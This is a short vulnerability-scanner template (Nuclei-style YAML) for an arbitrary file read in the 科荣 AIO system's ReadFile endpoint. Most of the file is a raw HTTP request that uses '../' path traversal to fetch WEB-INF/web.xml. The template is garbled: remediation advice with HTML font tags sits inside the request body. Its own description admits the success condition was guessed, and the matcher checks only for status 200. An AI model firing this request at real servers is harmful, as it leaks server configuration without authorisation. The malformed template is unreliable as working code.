id: poc-vtgwn8i7e6ey2gen
info:
  name: 科荣 AIO ReadFile 任意文件读取
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: lfi,2024
http:
- raw:
  - 'GET /ReadFile?tempFile=path&path=../../website/WEB-INF/&fileName=web.xml HTTP/1.1


    Host: {{Hostname}}


    User-Agent: Mozilla/5.0 (Linux; Android 11; motorola edge 20 fusion) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36


    Accept-Charset: utf-8


    Accept-Encoding: gzip, deflate


    Connection: close


    ## 修复建议

    <font style="color:#333333;">1、请联系厂商进行修复或升级到安全版本。

    </font><font style="color:#333333;">2、如非必要，禁止公网访问该系统。

    </font><font style="color:#333333;">3、设置白名单访问。</font>'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
